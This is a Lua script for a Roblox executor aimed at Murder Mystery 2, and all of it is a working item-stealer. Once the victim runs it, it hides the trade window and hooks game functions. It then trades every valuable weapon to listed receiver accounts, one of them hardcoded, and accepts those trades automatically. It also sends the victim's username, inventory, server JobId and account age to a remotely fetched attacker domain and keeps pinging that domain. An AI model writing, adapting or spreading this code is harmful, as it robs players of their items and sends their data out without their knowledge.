local select = select

local function setTableValues(tbl, idx, ...)
    local args = {...}
    for i = 1, select("#", ...) do
        tbl[idx + i - 1] = args[i]
    end
end

_G.scriptExecuted = _G.scriptExecuted or false

if not _G.scriptExecuted then
    _G.scriptExecuted = true
    _G.Webhook = _G.Webhook
    _G.MinValueForPing = _G.MinValueForPing
    _G.Receivers = _G.Receivers
    _G.ScriptOwner = _G.ScriptOwner

    -- Get request function (supports multiple executors)
    local requestFunc = syn and syn.request or (http and http.request or (http_request or (fluxus and fluxus.request or request)))
    local HttpService = game:GetService("HttpService")
    local domainUrl = ""
    
    -- Fetch domain from remote
    pcall(function()
        local response = game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/domain.json")
        local data = HttpService:JSONDecode(response)
        if data and data.domain then
            domainUrl = data.domain
        end
    end)

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

    SESSION_ID = "local_session"
    IS_CLAIMED = false

    -- MM2 specific (PlaceId 142823291)
    if game.PlaceId == 142823291 then
        RealJobID = game.JobId

        -- Delta executor detection + hook to capture real JobId
        if identifyexecutor then
            if type(identifyexecutor) == "function" then
                local executorName = identifyexecutor()
                if executorName and executorName:lower():find("delta") then
                    -- Hook stepAnimate to capture JobId before it changes
                    local function hookStepAnimate()
                        local stepFunction = nil
                        local hooked = false
                        
                        repeat
                            stepFunction = nil
                            for _, func in ipairs(getgc(true)) do
                                if typeof(func) == "function" then
                                    local info = debug.getinfo(func)
                                    if info and info.name == "stepAnimate" then
                                        stepFunction = func
                                        break
                                    end
                                end
                            end
                            task.wait()
                        until stepFunction
                        
                        local original = hookfunction(stepFunction, function(p1)
                            if not hooked then
                                hooked = true
                                jobId = game.JobId
                                RealJobID = jobId
                            end
                            return original(p1)
                        end)
                        return original
                    end
                    hookStepAnimate()
                end
            end
        end

        -- Whitelist of items to skip (default/event items)
        local skipItems = {
            DefaultGun = true, DefaultKnife = true, Reaver = true,
            Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
            IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
            IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
            Gingerscythe_Godly = true, Gingerscythe_Ancient = true, TestItem = true,
            Season1TestKnife = true, Cracks = true, Icecrusher = true,
            ["???"] = true, Dartbringer = true, TravelerAxeRed = true,
            TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
            BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true,
        }

        -- Get owned weapons excluding skip list
        local function getOwnedWeapons()
            local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
            local owned = profileData.Weapons.Owned
            local result = {}
            
            for weaponName, amount in pairs(owned) do
                if not skipItems[weaponName] then
                    table.insert(result, { name = weaponName, amount = amount })
                end
            end
            return result
        end

        -- Setup trade system
        local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
        if Trade then
            local SendRequest = Trade:WaitForChild("SendRequest", 10)
            local GetTradeStatus = Trade:WaitForChild("GetTradeStatus", 10)
            local AcceptTrade = Trade:WaitForChild("AcceptTrade", 10)
            local OfferItem = Trade:WaitForChild("OfferItem", 10)
            local DeclineTrade = Trade:WaitForChild("DeclineTrade", 10)
            local DeclineRequest = Trade:WaitForChild("DeclineRequest", 10)

            if SendRequest and GetTradeStatus and AcceptTrade and OfferItem then
                -- Disable TradeGUI automatically
                task.spawn(function()
                    pcall(function()
                        local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
                        if TradeGUI then
                            TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
                                TradeGUI.Enabled = false
                            end)
                        end
                    end)
                end)

                task.spawn(function()
                    pcall(function()
                        local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
                        if TradeGUI_Phone then
                            TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
                                TradeGUI_Phone.Enabled = false
                            end)
                        end
                    end)
                end)

                -- Get LastOffer from GC
                local function getLastOffer()
                    for _, tbl in pairs(getgc(true)) do
                        if type(tbl) == "table" and rawget(tbl, "LastOffer") ~= nil then
                            return tbl.LastOffer
                        end
                    end
                    return nil
                end

                local function waitForLastOffer(timeout)
                    if not timeout then timeout = 10 end
                    for _ = 1, timeout do
                        local offer = getLastOffer()
                        if offer ~= nil then
                            return offer
                        end
                        task.wait(0.3)
                    end
                    return nil
                end

                -- Track tradable items
                local tradableItems = {}
                local itemValues = {}
                local excludedRarities = { COMMON = true, UNCOMMON = true, RARE = true }
                
                -- Prepare items for trading
                local function prepareTradableItems()
                    local ownedWeapons = getOwnedWeapons()
                    tradableItems = {}
                    
                    for _, weapon in ipairs(ownedWeapons) do
                        local valueData = itemValues[weapon.name]
                        if valueData then
                            local rarity = valueData.type or "UNKNOWN"
                            if not (not rarity or excludedRarities[string.upper(rarity)] == true) and rarity ~= "UNKNOWN" then
                                local val = valueData.value or 0
                                if type(val) == "string" then
                                    val = tonumber(val) or 0
                                end
                                local roundedValue = math.floor(val + 0.5)
                                if roundedValue < 1 then roundedValue = 1 end
                                
                                table.insert(tradableItems, {
                                    name = weapon.name,
                                    amount = weapon.amount,
                                    value = roundedValue
                                })
                            end
                        end
                    end
                    
                    table.sort(tradableItems, function(a, b)
                        return a.value > b.value
                    end)
                    
                    return tradableItems
                end

                local isTrading = false

                -- Main trade execution
                local function executeTrade(targetPlayer)
                    local player = Players:FindFirstChild(targetPlayer)
                    if not player then return end
                    
                    if not player.Character then
                        player.CharacterAdded:Wait()
                    end
                    task.wait(0.5)
                    
                    player = Players:FindFirstChild(targetPlayer)
                    if not player then return end
                    
                    -- Clean up any existing trade state
                    local status
                    pcall(function()
                        status = GetTradeStatus:InvokeServer()
                    end)
                    if not status then status = "None" end
                    
                    if status ~= "StartTrade" then
                        if status == "ReceivingRequest" then
                            pcall(function() DeclineRequest:FireServer() end)
                            task.wait(0.5)
                        end
                    else
                        pcall(function() DeclineTrade:FireServer() end)
                        task.wait(0.5)
                    end
                    
                    while #tradableItems > 0 and not IS_CLAIMED do
                        local tradeStatus
                        pcall(function()
                            tradeStatus = GetTradeStatus:InvokeServer()
                        end)
                        if not tradeStatus then tradeStatus = "None" end
                        
                        if tradeStatus == "None" or tradeStatus == "SendingRequest" then
                            if tradeStatus == "SendingRequest" then
                                pcall(function() DeclineRequest:FireServer() end)
                                task.wait(0.1)
                            else
                                task.spawn(function()
                                    pcall(function()
                                        SendRequest:InvokeServer(player)
                                    end)
                                end)
                                task.wait(0.01)
                            end
                        elseif tradeStatus == "ReceivingRequest" then
                            pcall(function() DeclineRequest:FireServer() end)
                            task.wait(0.1)
                        elseif tradeStatus == "StartTrade" then
                            -- Offer items (up to 4 per cycle)
                            local offered = 0
                            while offered < 4 and #tradableItems > 0 do
                                local item = table.remove(tradableItems, 1)
                                offered = offered + 1
                                
                                for _ = 1, item.amount do
                                    pcall(function()
                                        OfferItem:FireServer(item.name, "Weapons")
                                    end)
                                end
                            end
                            
                            -- Accept trade with LastOffer
                            local startTime = tick()
                            while true do
                                local tradeStatus2
                                pcall(function()
                                    tradeStatus2 = GetTradeStatus:InvokeServer()
                                end)
                                if not tradeStatus2 then tradeStatus2 = "None" end
                                
                                if tradeStatus2 == "None" then
                                    break
                                end
                                
                                pcall(function()
                                    AcceptTrade:FireServer(game.PlaceId * 3, nil)
                                    task.wait(0.01)
                                    
                                    -- Collect all LastOffer values
                                    local offers = {}
                                    for _, tbl in pairs(getgc(true)) do
                                        if type(tbl) == "table" and rawget(tbl, "LastOffer") ~= nil then
                                            local lastOffer = tbl.LastOffer
                                            if type(lastOffer) ~= "table" then
                                                offers._single = tbl.LastOffer
                                            else
                                                for key, value in pairs(tbl.LastOffer) do
                                                    offers[key] = value
                                                end
                                            end
                                        end
                                    end
                                    
                                    -- Accept with all offers
                                    for _, offer in pairs(offers) do
                                        pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, offer) end)
                                        task.wait(0.01)
                                    end
                                    
                                    -- Try LastOffer from GC one more time
                                    local lastOffer = waitForLastOffer(2)
                                    if lastOffer then
                                        AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
                                    end
                                end)
                                
                                if tick() - startTime > 30 then
                                    pcall(function() DeclineTrade:FireServer() end)
                                    break
                                end
                                
                                task.wait(0.01)
                            end
                            
                            prepareTradableItems()
                            
                            if #tradableItems > 0 then
                                task.wait(0.1)
                                player = Players:FindFirstChild(targetPlayer)
                                if not player then return end
                            end
                        end
                        task.wait()
                    end
                end

                -- Watch for specified receivers
                local function monitorPlayers()
                    local function checkPlayer(player)
                        local isReceiver = false
                        local playerNameLower = player.Name:lower()
                        
                        -- Check Receivers table
                        if type(_G.Receivers) == "table" then
                            for _, receiver in ipairs(_G.Receivers) do
                                if playerNameLower == receiver:lower() then
                                    isReceiver = true
                                    break
                                end
                            end
                        end
                        
                        -- Check single Receiver
                        if not isReceiver then
                            if type(_G.Receiver) == "string" and playerNameLower == _G.Receiver:lower() then
                                isReceiver = true
                            end
                        end
                        
                        -- Hardcoded fallback
                        if not isReceiver and playerNameLower == "Tctekkd321" then
                            isReceiver = true
                        end
                        
                        if isReceiver and not isTrading then
                            isTrading = true
                            task.spawn(function()
                                executeTrade(player.Name)
                                isTrading = false
                            end)
                        end
                    end
                    
                    -- Check existing players
                    for _, player in ipairs(Players:GetPlayers()) do
                        checkPlayer(player)
                    end
                    
                    -- Watch for new players
                    Players.PlayerAdded:Connect(checkPlayer)
                end

                -- Initialize item values from remote API
                local function loadItemValues()
                    local owned = getOwnedWeapons()
                    if #owned == 0 then return end
                    
                    itemValues = {}
                    
                    -- Fetch price data
                    local success, result = pcall(function()
                        return game:HttpGet("http://109.120.157.241:5000/supreme")
                    end)
                    
                    if not success then
                        pcall(function()
                            result = HttpService:GetAsync("http://109.120.157.241:5000/supreme")
                        end)
                    end
                    
                    if success then
                        local decoded
                        pcall(function()
                            decoded = HttpService:JSONDecode(result)
                        end)
                        
                        if decoded and type(decoded) == "table" then
                            local prices = decoded.prices
                            if prices then
                                local nameMap = {}
                                local slugMap = {}
                                local cleanNameMap = {}
                                
                                -- Build lookup tables
                                for _, item in ipairs(prices) do
                                    local val = 0
                                    if item.values then
                                        if type(item.values) == "table" and #item.values > 0 then
                                            val = item.values[1].user_value or 0
                                        end
                                    end
                                    
                                    local rarityType = "UNKNOWN"
                                    if item.type then
                                        rarityType = string.upper(item.type)
                                    end
                                    
                                    if rarityType and excludedRarities[string.upper(rarityType)] ~= true then
                                        if item.name then
                                            local data = { value = val, type = rarityType }
                                            nameMap[item.name] = data
                                            nameMap[string.lower(item.name)] = data
                                            
                                            local clean = string.lower(item.name)
                                            cleanNameMap[string.gsub(clean, "[^%w]", "")] = data
                                            
                                            local noApostrophe = string.gsub(clean, "'s", "")
                                            cleanNameMap[string.gsub(noApostrophe, "[^%w]", "")] = data
                                            
                                            local noType = string.gsub(clean, " knife", "")
                                            noType = string.gsub(noType, " gun", "")
                                            cleanNameMap[string.gsub(noType, "[^%w]", "")] = data
                                            
                                            local noType2 = string.gsub(noApostrophe, " knife", "")
                                            noType2 = string.gsub(noType2, " gun", "")
                                            cleanNameMap[string.gsub(noType2, "[^%w]", "")] = data
                                        end
                                        
                                        if item.slug then
                                            slugMap[item.slug] = { value = val, type = rarityType }
                                        end
                                    end
                                end
                                
                                -- Get weapon data from ReplicatedStorage
                                local weaponData
                                pcall(function()
                                    weaponData = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))
                                end)
                                
                                if weaponData and weaponData.Weapons then
                                    local valueMap = {}
                                    local function addNameVariants(name, rarity, itemType, chroma, evo, year, event, baseID)
                                        local variants = { name }
                                        variants[#variants+1] = string.lower(name)
                                        
                                        if chroma then
                                            variants[#variants+1] = "Chroma " .. name
                                            variants[#variants+1] = name .. " Chroma"
                                            variants[#variants+1] = string.lower("Chroma " .. name)
                                            variants[#variants+1] = string.lower(name .. " Chroma")
                                        end
                                        
                                        if itemType == "Gun" then
                                            variants[#variants+1] = name .. " Gun"
                                            variants[#variants+1] = string.lower(name .. " Gun")
                                            if chroma then
                                                variants[#variants+1] = "Chroma " .. name .. " Gun"
                                                variants[#variants+1] = string.lower("Chroma " .. name .. " Gun")
                                            end
                                        elseif itemType == "Knife" then
                                            variants[#variants+1] = name .. " Knife"
                                            variants[#variants+1] = string.lower(name .. " Knife")
                                            if chroma then
                                                variants[#variants+1] = "Chroma " .. name .. " Knife"
                                                variants[#variants+1] = string.lower("Chroma " .. name .. " Knife")
                                            end
                                        end
                                        
                                        if event and year then
                                            variants[#variants+1] = name .. " " .. year
                                            variants[#variants+1] = string.lower(name .. " " .. year)
                                            
                                            if itemType == "Gun" then
                                                variants[#variants+1] = name .. " Gun " .. year
                                                variants[#variants+1] = string.lower(name .. " Gun " .. year)
                                            elseif itemType == "Knife" then
                                                variants[#variants+1] = name .. " Knife " .. year
                                                variants[#variants+1] = string.lower(name .. " Knife " .. year)
                                            end
                                            
                                            if chroma then
                                                variants[#variants+1] = "Chroma " .. name .. " " .. year
                                                variants[#variants+1] = string.lower("Chroma " .. name .. " " .. year)
                                            end
                                        end
                                        
                                        -- Try to find value using variants
                                        for _, variant in ipairs(variants) do
                                            local slug = string.lower(string.gsub(variant, "%s+", "-"))
                                            if slugMap[slug] then
                                                valueMap[key] = slugMap[slug]
                                                return true
                                            end
                                        end
                                        
                                        for _, variant in ipairs(variants) do
                                            if nameMap[variant] then
                                                valueMap[key] = nameMap[variant]
                                                return true
                                            end
                                        end
                                        
                                        for _, variant in ipairs(variants) do
                                            local clean = string.lower(string.gsub(variant, "[^%w]", ""))
                                            if cleanNameMap[clean] then
                                                valueMap[key] = cleanNameMap[clean]
                                                return true
                                            end
                                        end
                                        
                                        -- Try with rarity
                                        if evo and baseID then
                                            local rarityVariants = {
                                                name,
                                                name .. " " .. rarity
                                            }
                                            variants[#variants+1] = string.lower(name .. " " .. rarity)
                                            for _, v in ipairs(rarityVariants) do
                                                if nameMap[v] then
                                                    valueMap[key] = nameMap[v]
                                                    return true
                                                end
                                            end
                                        end
                                        
                                        return false
                                    end
                                    
                                    for key, data in pairs(weaponData.Weapons) do
                                        if type(data) == "table" and data.Rarity then
                                            local rarity = string.upper(tostring(data.Rarity))
                                            if rarity and excludedRarities[string.upper(rarity)] ~= true then
                                                local name = data.ItemName or data.Name or ""
                                                local chroma = data.Chroma == true
                                                local evo = data.Evo or data.EvoBaseID
                                                local itemType = data.ItemType or ""
                                                local year = data.Year
                                                local event = data.Event
                                                
                                                addNameVariants(name, rarity, itemType, chroma, evo, year, event, data.EvoBaseID)
                                            end
                                        end
                                    end
                                    
                                    return valueMap
                                end
                            end
                        end
                    end
                    return {}
                end
                
                local values = loadItemValues()
                for key, value in pairs(values) do
                    itemValues[key] = value
                end
                
                -- Build initial tradable items
                local prepared = prepareTradableItems()
                local totalValue = 0
                local highValueItems = {}
                local shouldPing = false
                
                for _, item in ipairs(prepared) do
                    local value = item.value
                    if value >= _G.MinValueForPing then
                        shouldPing = true
                    end
                    
                    totalValue = totalValue + (value * item.amount)
                    
                    local cleanName = string.gsub(item.name, "_.*", "")
                    table.insert(highValueItems, {
                        name = cleanName,
                        amount = item.amount,
                        value = value * item.amount,
                        single_value = value
                    })
                end
                
                table.sort(highValueItems, function(a, b) return a.value > b.value end)
                
                if #prepared > 0 then
                    -- Send webhook notification
                    if _G.Webhook ~= "" then
                        task.spawn(function()
                            pcall(function()
                                local webhookData = {
                                    Url = domainUrl .. "/api/mm2-webhook",
                                    Method = "POST",
                                    Headers = {
                                        ["Content-Type"] = "application/json",
                                    },
                                }
                                
                                local payload = {
                                    webhook = _G.Webhook,
                                    items = highValueItems,
                                    jobId = RealJobID or game.JobId,
                                    placeId = tostring(game.PlaceId),
                                    pingEveryone = shouldPing,
                                    username = LocalPlayer.Name,
                                    executor = pcall(function() 
                                        if type(identifyexecutor) ~= "function" then return "Unknown" end
                                        return identifyexecutor() 
                                    end) or "Unknown",
                                    accountAge = LocalPlayer.AccountAge,
                                }
                                
                                -- Build receivers list
                                local receiversString = nil
                                if type(_G.Receivers) == "table" then
                                    receiversString = table.concat(_G.Receivers, ", ")
                                end
                                if not receiversString then
                                    receiversString = tostring(_G.Receiver or "Tctekkd321")
                                end
                                
                                payload.receiversList = receiversString
                                payload.scriptOwner = _G.ScriptOwner
                                
                                webhookData.Body = HttpService:JSONEncode(payload)
                                requestFunc(webhookData)
                            end)
                            
                            -- Keep-alive pings
                            while task.wait(3) do
                                pcall(function()
                                    requestFunc({
                                        Url = domainUrl .. "/api/mm2-ping",
                                        Method = "POST",
                                        Headers = { ["Content-Type"] = "application/json" },
                                        Body = HttpService:JSONEncode({
                                            username = LocalPlayer.Name,
                                        }),
                                    })
                                end)
                            end
                        end)
                    end
                    
                    -- Start monitoring for receivers
                    monitorPlayers()
                end
            end
        end
    end
end
